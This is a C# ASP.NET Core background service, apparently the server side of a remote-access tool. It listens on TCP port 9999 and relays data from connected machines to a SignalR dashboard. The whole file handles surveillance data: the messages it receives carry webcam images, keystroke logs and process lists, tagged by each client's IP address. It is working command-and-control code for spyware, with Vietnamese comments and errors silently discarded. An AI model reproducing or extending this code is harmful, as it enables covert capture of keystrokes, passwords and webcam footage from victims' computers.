using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Hosting;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WebRelay.Hubs;

namespace WebRelay.Services
{
    public class TcpListenerService : BackgroundService
    {
        private TcpListener _listener;
        private readonly IHubContext<ControlHub> _hubContext;

        public TcpListenerService(IHubContext<ControlHub> hubContext)
        {
            _hubContext = hubContext;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            try
            {
                _listener = new TcpListener(IPAddress.Any, 9999);
                _listener.Start();
                Console.WriteLine("SERVER TCP LISTENING 9999 (LENGTH-PREFIX MODE)");

                while (!stoppingToken.IsCancellationRequested)
                {
                    var client = await _listener.AcceptTcpClientAsync();
                    var ip = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                    ControlHub.ActiveClients[ip] = client;
                    await _hubContext.Clients.All.SendAsync("ClientConnected", ip);
                    _ = Task.Run(() => HandleClient(client, ip, stoppingToken));
                }
            }
            catch { }
        }

        private async Task HandleClient(TcpClient client, string ip, CancellationToken token)
        {
            try
            {
                var stream = client.GetStream();
                while (client.Connected && !token.IsCancellationRequested)
                {
                    // 1. Đọc 4 byte độ dài
                    byte[] lenBuffer = new byte[4];
                    int read = await stream.ReadAsync(lenBuffer, 0, 4, token);
                    if (read == 0) break;

                    int packetLen = BitConverter.ToInt32(lenBuffer, 0);

                    // 2. Đọc nội dung dựa trên độ dài
                    if (packetLen > 0)
                    {
                        byte[] data = new byte[packetLen];
                        int totalRead = 0;
                        while (totalRead < packetLen)
                        {
                            int r = await stream.ReadAsync(data, totalRead, packetLen - totalRead, token);
                            if (r == 0) break;
                            totalRead += r;
                        }

                        string msg = Encoding.UTF8.GetString(data);

                        if (msg.StartsWith("IMG|"))
                            await _hubContext.Clients.All.SendAsync("ReceiveWebcam", msg.Substring(4));
                        else if (msg.StartsWith("KEYLOG:"))
                            await _hubContext.Clients.All.SendAsync("ReceiveLog", $"[KEYLOG TỪ {ip}]\n{msg.Substring(7)}");
                        else if (msg.StartsWith("PID:"))
                            await _hubContext.Clients.All.SendAsync("ReceiveLog", $"[APP TỪ {ip}]\n{msg.Substring(4)}");
                        else
                            await _hubContext.Clients.All.SendAsync("ReceiveLog", $"[{ip}] {msg}");
                    }
                }
            }
            catch { }
            ControlHub.ActiveClients.TryRemove(ip, out _);
        }
    }
}